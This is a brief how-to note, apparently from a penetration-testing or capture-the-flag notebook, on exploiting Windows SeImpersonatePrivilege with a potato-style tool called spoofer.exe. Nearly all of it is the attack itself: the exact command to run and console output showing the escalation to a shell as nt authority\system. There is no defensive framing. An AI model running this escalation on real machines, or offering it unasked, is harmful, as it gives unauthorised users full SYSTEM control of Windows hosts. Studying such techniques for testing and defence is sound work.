### how to exploit SeImpersonatePrivilege using a juicePotato binary
With potato we can easy use the followint command 
``
C:\Users\Public\Desktop>spoofer.exe -i -c cmd``


```
C:\Users\Public\Desktop>spoofer.exe -i -c cmd
spoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.                                                                                                                                                                                          

C:\Windows\system32>whoami
whoami
nt authority\system 
```
